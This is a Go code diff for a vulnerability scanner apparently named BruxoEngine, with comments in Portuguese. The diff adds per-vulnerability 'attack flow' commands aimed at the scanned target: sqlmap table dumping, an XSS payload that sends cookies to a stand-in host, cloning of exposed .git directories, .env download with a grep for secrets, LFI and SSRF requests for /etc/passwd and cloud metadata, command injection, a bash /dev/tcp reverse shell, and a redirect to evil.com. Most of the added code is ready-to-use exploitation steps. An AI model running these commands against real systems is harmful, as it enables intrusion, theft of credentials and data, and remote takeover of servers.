@@ -597,20 +597,61 @@ func (b *BruxoEngine) generateHTMLReport() error {
 }
 
 func (b *BruxoEngine) generateAttackFlow(vulnName, targetURL string) AttackFlow {
+	// Garante que a URL não termine com a vulnerabilidade em si (ex: .git/config)
+	parsedURL, err := url.Parse(targetURL)
+	if err != nil {
+		return nil // Retorna nulo se a URL for inválida
+	}
+	baseURL := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
+
 	switch vulnName {
 	case "SQL Injection":
 		return []AttackStep{
-			{Stage: "Detecção", Command: fmt.Sprintf(`sqlmap -u "%s" --dbs --batch`, targetURL)},
+			{Stage: "Detecção", Command: fmt.Sprintf(`sqlmap -u "%s" --dbs --batch --risk=3 --level=5`, targetURL)},
 			{Stage: "Exploração", Command: fmt.Sprintf(`sqlmap -u "%s" -D <database> --tables --batch`, targetURL)},
 			{Stage: "Exfiltração", Command: fmt.Sprintf(`sqlmap -u "%s" -D <database> -T <tabela> --dump --batch`, targetURL)},
 		}
 	case "Cross-Site Scripting (XSS)":
 		return []AttackStep{
 			{Stage: "Verificação", Command: `<script>alert(document.domain)</script>`},
-			{Stage: "Exploração", Command: `<script>fetch('https://sua-maquina.com/?cookie='+document.cookie)</script>`},
-			{Stage: "Pivoting", Command: `document.location='https://site-interno-da-rede'`},
+			{Stage: "Exploração (Cookie Stealer)", Command: `<script>fetch('https://sua-maquina.com/?c='+document.cookie)</script>`},
+			{Stage: "Pivoting (Redirecionamento)", Command: `document.location='https://site-interno-da-rede'`},
 		}
-		// Adicione mais casos para outras vulnerabilidades aqui
+	case "Exposed Git Repository":
+		return []AttackStep{
+			{Stage: "Clonar com git-dumper", Command: fmt.Sprintf(`git-dumper %s %s-git`, baseURL, parsedURL.Host)},
+			{Stage: "Verificar Logs", Command: fmt.Sprintf(`cd %s-git && git log -p`, parsedURL.Host)},
+			{Stage: "Extrair Código", Command: fmt.Sprintf(`cd %s-git && git checkout .`, parsedURL.Host)},
+		}
+	case "Exposed Environment File (.env)":
+		return []AttackStep{
+			{Stage: "Baixar Arquivo .env", Command: fmt.Sprintf(`curl %s`, targetURL)},
+			{Stage: "Inspecionar Variáveis Sensíveis", Command: `grep -E 'API_KEY|SECRET|PASSWORD|TOKEN' .env`},
+		}
+	case "Local File Inclusion (LFI)":
+		return []AttackStep{
+			{Stage: "Ler /etc/passwd", Command: fmt.Sprintf(`curl "%s?file=../../../../../../../../etc/passwd"`, baseURL)},
+			{Stage: "Ler Logs do Servidor (Log Poisoning)", Command: fmt.Sprintf(`curl "%s?file=../../../../../../../../var/log/apache2/access.log"`, baseURL)},
+		}
+	case "Command Injection":
+		return []AttackStep{
+			{Stage: "Verificar Execução (ping)", Command: fmt.Sprintf(`curl "%s?host=127.0.0.1; id"`, baseURL)},
+			{Stage: "Listar Arquivos", Command: fmt.Sprintf(`curl "%s?host=127.0.0.1; ls -la"`, baseURL)},
+			{Stage: "Reverse Shell", Command: `bash -i >& /dev/tcp/SUA_MAQUINA/PORTA 0>&1`},
+		}
+	case "Server-Side Request Forgery (SSRF)":
+		return []AttackStep{
+			{Stage: "Acessar Metadados da Cloud (AWS)", Command: fmt.Sprintf(`curl "%s?url=http://169.254.169.254/latest/meta-data/"`, baseURL)},
+			{Stage: "Escanear Portas Internas", Command: fmt.Sprintf(`curl "%s?url=http://localhost:8080"`, baseURL)},
+		}
+	case "Directory Traversal":
+		return []AttackStep{
+			{Stage: "Acessar /etc/passwd", Command: fmt.Sprintf(`curl "%s/..%%2f..%%2f..%%2f..%%2fetc/passwd"`, targetURL)},
+		}
+	case "Open Redirect":
+		return []AttackStep{
+			{Stage: "Redirecionamento para Site Malicioso", Command: fmt.Sprintf(`%s?redirect=https://evil.com`, targetURL)},
+		}
 	}
 	return nil
 }
